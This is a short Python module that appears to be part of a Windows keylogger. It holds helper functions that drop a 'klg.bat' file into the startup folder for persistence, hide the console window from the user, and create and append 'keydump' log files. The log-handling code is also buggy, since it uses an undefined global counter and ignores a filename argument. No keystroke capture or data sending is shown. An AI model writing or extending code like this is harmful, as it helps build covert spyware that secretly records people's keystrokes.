import os
import win32gui, win32con, win32console
global count
# newdir = 

def newbat(thispath, pypath, startup):
    with open(os.path.join(startup,"klg.bat"), "x") as file:
        file.write("@echo off\n")
        file.write(f"{pypath} {thispath}")

def hidecmd():
    cwindow = win32console.GetConsoleWindow()
    win32gui.ShowWindow(cwindow, win32con.SW_HIDE)

def showwindow():
    cwindow = win32console.GetConsoleWindow()
    win32gui.ShowWindow(cwindow, win32con.SW_SHOW)

def createlog(applocal, logname):
    try:
        open(os.path.join(applocal, logname), "x")
    except FileExistsError:
        newdumpname = f"keydump({count}).txt"
        createlog(applocal, newdumpname)

def updatelog(applocal, logname, dumptxt):
    try:
        with open(os.path.join(applocal,"keydump.txt"), "a") as file:
            file.write(dumptxt + "\n")
    except FileNotFoundError:
        createlog(applocal, logname)

# def checklogcount(applocal):
    # return count



